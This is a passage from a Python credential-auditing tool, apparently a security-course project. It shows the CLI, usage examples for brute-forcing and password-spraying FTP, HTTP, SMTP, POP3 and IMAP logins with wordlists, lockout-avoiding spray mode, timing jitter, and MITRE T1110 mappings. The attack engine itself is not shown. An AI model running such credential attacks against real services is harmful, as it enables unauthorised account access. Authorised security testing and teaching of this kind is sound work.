# ──────────────────────────────────────────────────────────────────────────────
# CLI argument parser
# ──────────────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="credaudit",
        description=(
            "Network Service Credential Auditor — multi-protocol brute-force\n"
            "framework (FTP · HTTP Basic · HTTP Form · SMTP · POP3 · IMAP)\n"
            "built on the Python standard library.\n\n"
            "WARNING: Authorised use only.  Unauthorised access is illegal."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples
────────
  # FTP default credentials against a single host
  python3 credaudit.py --host 192.168.100.20 --port 21 --protocol ftp

  # IMAP with a combo file
  python3 credaudit.py --host mail.lab.local --port 993 --protocol imap --tls \\
      --combo-file combos.txt --delay 1.0

  # HTTP Basic Auth with inline wordlists
  python3 credaudit.py --host 192.168.100.30 --port 80 --protocol http-basic \\
      --login-url /admin/ \\
      --usernames admin,root,user \\
      --passwords admin,password,123456,letmein

  # HTTP Form with success/failure patterns
  python3 credaudit.py --host 192.168.100.30 --port 8080 --protocol http-form \\
      --login-url /login \\
      --username-field user --password-field pass \\
      --success-pattern "Welcome back" --failure-pattern "Invalid credentials" \\
      --combo-file rockyou_top1000.txt --workers 2 --delay 2.0

  # Password spraying (test one password against many users, avoids per-account lockout)
  python3 credaudit.py --host 192.168.100.50 --port 25 --protocol smtp \\
      --usernames alice,bob,charlie,dave --passwords Summer2024! \\
      --spray --delay 5.0 --json results.json
        """,
    )

    # Target
    tgt = p.add_argument_group("Target")
    tgt.add_argument("--host",     required=True, help="Target hostname or IP")
    tgt.add_argument("--port",     type=int,      help="Service port (default: protocol default)")
    tgt.add_argument("--protocol", required=True,
                     choices=[pr.value for pr in Protocol],
                     help="Protocol to audit")
    tgt.add_argument("--tls",      action="store_true",
                     help="Use TLS/SSL (FTP_TLS, SMTP_SSL, POP3_SSL, IMAP4_SSL, HTTPS)")

    # HTTP extras
    http = p.add_argument_group("HTTP options")
    http.add_argument("--login-url",       default="/",
                      help="URL path for Basic or Form auth (default: /)")
    http.add_argument("--username-field",  default="username",
                      help="Form field name for username (http-form)")
    http.add_argument("--password-field",  default="password",
                      help="Form field name for password (http-form)")
    http.add_argument("--success-pattern", default="",
                      help="Regex matched against response body — treat as success")
    http.add_argument("--failure-pattern", default="",
                      help="Regex matched against response body — treat as failure")

    # SMTP extras
    smtp = p.add_argument_group("SMTP options")
    smtp.add_argument("--smtp-domain", default="localhost",
                      help="EHLO domain string (default: localhost)")

    # Credentials
    creds = p.add_argument_group("Credentials")
    creds.add_argument("--usernames",  default="",
                       help="Comma-separated list of usernames")
    creds.add_argument("--passwords",  default="",
                       help="Comma-separated list of passwords")
    creds.add_argument("--combo-file", metavar="PATH",
                       help="File with user:pass entries, one per line")
    creds.add_argument("--cred",       metavar="USER:PASS",
                       help="Single credential to test")
    creds.add_argument("--spray",      action="store_true",
                       help="Password spray mode: test each password against all users")

    # Engine
    eng = p.add_argument_group("Engine")
    eng.add_argument("--timeout",  type=float, default=8.0,
                     help="Per-attempt socket timeout in seconds (default: 8)")
    eng.add_argument("--workers",  type=int,   default=2,
                     help="Concurrent worker threads (default: 2)")
    eng.add_argument("--delay",    type=float, default=0.5,
                     help="Base delay between attempts in seconds (default: 0.5)")
    eng.add_argument("--jitter",   type=float, default=0.2,
                     help="Gaussian jitter std-dev in seconds (default: 0.2)")
    eng.add_argument("--stop-on-success", action="store_true",
                     help="Stop after first successful credential for this service")
    eng.add_argument("--verbose",  action="store_true",
                     help="Print all attempts including failures and errors")

    # Output
    out = p.add_argument_group("Output")
    out.add_argument("--json", metavar="PATH",
                     help="Write full JSON report to file")

    return p


# ──────────────────────────────────────────────────────────────────────────────
# Default ports per protocol
# ──────────────────────────────────────────────────────────────────────────────

DEFAULT_PORTS: dict[Protocol, int] = {
    Protocol.FTP:        21,
    Protocol.HTTP_BASIC: 80,
    Protocol.HTTP_FORM:  80,
    Protocol.SMTP:       25,
    Protocol.POP3:       110,
    Protocol.IMAP:       143,
}

DEFAULT_PORTS_TLS: dict[Protocol, int] = {
    Protocol.FTP:        990,
    Protocol.HTTP_BASIC: 443,
    Protocol.HTTP_FORM:  443,
    Protocol.SMTP:       465,
    Protocol.POP3:       995,
    Protocol.IMAP:       993,
}

MITRE_ENTRIES = [
    {
        "id": "T1110",
        "name": "Brute Force",
        "url": "https://attack.mitre.org/techniques/T1110/",
    },
    {
        "id": "T1110.001",
        "name": "Password Guessing",
        "url": "https://attack.mitre.org/techniques/T1110/001/",
    },
    {
        "id": "T1110.003",
        "name": "Password Spraying",
        "url": "https://attack.mitre.org/techniques/T1110/003/",
    },
    {
        "id": "T1078",
        "name": "Valid Accounts",
        "url": "https://attack.mitre.org/techniques/T1078/",
    },
]


# ──────────────────────────────────────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    protocol = Protocol(args.protocol)

    # Resolve port
    if args.port:
        port = args.port
    elif args.tls:
        port = DEFAULT_PORTS_TLS[protocol]
    else:
        port = DEFAULT_PORTS[protocol]

    target = TargetService(
        host=args.host,
        port=port,
        protocol=protocol,
        tls=args.tls,
        login_url=args.login_url,
        username_field=args.username_field,
        password_field=args.password_field,
        success_pattern=args.success_pattern,
        failure_pattern=args.failure_pattern,
        smtp_domain=args.smtp_domain,
    )

    # Build credential list
    usernames = [u.strip() for u in args.usernames.split(",") if u.strip()] if args.usernames else []
    passwords = [p.strip() for p in args.passwords.split(",") if p.strip()] if args.passwords else []

    credentials = WordlistLoader.load(
        usernames=usernames,
        passwords=passwords,
        combo_file=args.combo_file,
        single_cred=args.cred,
        spray_mode=args.spray,
    )

    if not credentials:
        print(red("[!] No credentials to test.  Use --usernames/--passwords, "
                  "--combo-file, or --cred."))
        sys.exit(1)

    # Print banner
    print()
    print(bold(cyan("╔══════════════════════════════════════════════════════════════════╗")))
    print(bold(cyan("║      Network Service Credential Auditor  ·  Project 06          ║")))
    print(bold(cyan("║      Applied AI Security Projects  ·  Module 01 · Week 01       ║")))
    print(bold(cyan("╚══════════════════════════════════════════════════════════════════╝")))
    print()
    print(f"  {bold('Target:')}    {target.label()}")
    print(f"  {bold('Mode:')}      {'spray' if args.spray else 'brute-force'}")
    print(f"  {bold('Creds:')}     {len(credentials)}")
    print(f"  {bold('Workers:')}   {args.workers}")
    print(f"  {bold('Delay:')}     {args.delay}s ± {args.jitter}s jitter")
    print()
    print(yellow("  [!] Authorised use only.  Ensure you have written permission."))
    print(yellow(f"  [!] MITRE T1110 activity — check your rules of engagement."))
    print()

    scan_id = f"credaudit-{int(time.time())}"
    started_at = datetime.now(timezone.utc).isoformat()

    engine = AuditEngine(
        target=target,
        credentials=credentials,
        timeout=args.timeout,
        workers=args.workers,
        delay=args.delay,
        jitter=args.jitter,
        stop_on_success=args.stop_on_success,
        verbose=args.verbose,
    )

    service_result = engine.run()

    report = AuditReport(
        scan_id=scan_id,
        started_at=started_at,
        finished_at=datetime.now(timezone.utc).isoformat(),
        mitre=MITRE_ENTRIES,
        service_results=[service_result],
    )

    print_final_report(report)

    if args.json:
        try:
            with open(args.json, "w", encoding="utf-8") as fh:
                json.dump(report.to_dict(), fh, indent=2)
            print(f"\n  {green('✓')} JSON report saved → {bold(args.json)}\n")
        except OSError as exc:
            print(red(f"[!] Could not write JSON: {exc}"))


if __name__ == "__main__":
    main()
